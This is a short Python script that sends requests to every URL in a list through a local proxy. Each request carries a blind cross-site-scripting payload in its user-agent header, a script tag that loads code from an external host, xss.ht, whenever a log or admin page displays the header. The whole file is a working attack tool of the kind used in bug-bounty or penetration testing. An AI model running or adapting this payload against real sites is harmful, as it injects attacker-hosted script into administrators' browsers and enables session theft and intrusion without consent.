#!/bin/python
import requests
urlfile = open("url").readlines()

for i in urlfile:
	s =i.strip()
	try:
		req = requests.get(s,headers={'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko "><script src=https://mudoc.xss.ht></script>) Chrome/81.0.4044.138 Safari/537.36 OPR/68.0.3618.125'} , proxies={'http':'http://127.0.0.1:8080', 'https':'https://127.0.0.1:8080'})
		print(req.url)
	except:
		pass
